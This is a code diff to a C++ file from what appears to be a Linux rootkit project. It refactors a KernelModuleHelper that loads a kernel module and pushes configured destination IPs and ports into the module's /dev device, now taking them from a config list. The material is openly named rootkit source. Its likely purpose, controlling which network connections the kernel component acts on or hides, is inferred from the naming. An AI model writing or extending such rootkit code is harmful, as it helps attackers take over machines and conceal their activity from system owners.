@@ -1,4 +1,7 @@
 #include "rootkit/KernelModuleHelper.hpp"
+#include "common.h"
+#include "rootkit/ConfigManager.hpp"
+#include "rootkit/Utils.hpp"
 
 #include <fcntl.h>
 #include <cerrno>
@@ -10,15 +13,15 @@
 #include <cstdint>
 #include <format>
 
-rootkit::KernelModuleHelper::KernelModuleHelper(const std::string& module_path,
-                        const std::string& module_name,
+rootkit::KernelModuleHelper::KernelModuleHelper(const KernelModuleConfig& conf,
                         const std::string& module_dev_name
 )
-    :module_name(module_name),
-    module_path(module_path),
+    :conf(conf),
+    module_name(conf.module_name),
+    module_path(conf.module_path),
     module_dev_name(module_dev_name),
     loading_error(""),
-    data(std::nullopt)
+    data({})
 {
     int fd = open(module_path.c_str(), O_RDONLY);
     if (fd < 0) {
@@ -54,6 +57,10 @@ rootkit::KernelModuleHelper::KernelModuleHelper(const std::string& module_path,
         }
         std::cerr << loading_error << std::endl;
     }
+
+    if (status() == std::nullopt) {
+        set_data();
+    }
 }
 
 rootkit::KernelModuleHelper::~KernelModuleHelper() {
@@ -72,7 +79,27 @@ std::optional<std::string> rootkit::KernelModuleHelper::status() const {
     return std::nullopt;
 }
 
-bool rootkit::KernelModuleHelper::setData(const conn_info& data) {
+bool rootkit::KernelModuleHelper::set_data() {
+    for (const auto& ip_and_port : conf.ips_and_ports) {
+        auto ip = utils::convert_ip(ip_and_port.first);
+        if (!ip.has_value()) {
+            // TODO: send warning
+            continue;
+        }
+
+        conn_info conn_data;
+        conn_data.dport = ip_and_port.second;
+        conn_data.daddr = ip.value();
+
+        if (!this->set_data(conn_data)) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
+bool rootkit::KernelModuleHelper::set_data(const conn_info& data) {
     std::string dev_name = "/dev/" + module_dev_name;
     int fd = open(dev_name.c_str(), O_RDWR);
     if (fd < 0) {
@@ -89,11 +116,11 @@ bool rootkit::KernelModuleHelper::setData(const conn_info& data) {
     close(fd);
 
     // Set data internally
-    this->data = data;
+    this->data.push_back(data);
 
     return true;
 }
 
-std::optional<conn_info> rootkit::KernelModuleHelper::getData() const {
+std::vector<conn_info> rootkit::KernelModuleHelper::get_data() const {
     return data;
 }
